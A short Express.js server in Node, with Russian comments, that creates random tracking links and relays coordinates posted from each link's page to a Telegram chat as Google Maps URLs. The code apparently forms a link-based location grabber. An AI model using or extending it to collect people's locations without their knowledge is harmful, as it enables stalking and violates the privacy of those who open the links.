import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// In-memory хранилище для ссылок (MVP)
const links = new Set();

// Генерация уникальной ссылки
app.post('/api/generate', (req, res) => {
  const id = Math.random().toString(36).substring(2, 10);
  links.add(id);
  const url = `${process.env.BASE_URL || 'http://localhost:' + PORT}/${id}`;
  res.json({ id, url });
});

// Приём координат и отправка в Telegram
app.post('/api/geo/:id', async (req, res) => {
  const { id } = req.params;
  const { latitude, longitude } = req.body;
  if (!links.has(id)) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  if (typeof latitude !== 'number' || typeof longitude !== 'number') {
    return res.status(400).json({ error: 'Invalid coordinates' });
  }
  // Формируем сообщение
  const message = `Гео-ссылка: ${id}\nКоординаты: https://maps.google.com/?q=${latitude},${longitude}`;
  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Telegram error', details: e.message });
  }
});

// Статические файлы (frontend)
app.use(express.static('public'));

// Fallback для SPA (если нужно)
app.get('/:id', (req, res) => {
  res.sendFile(process.cwd() + '/public/index.html');
});

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
}); 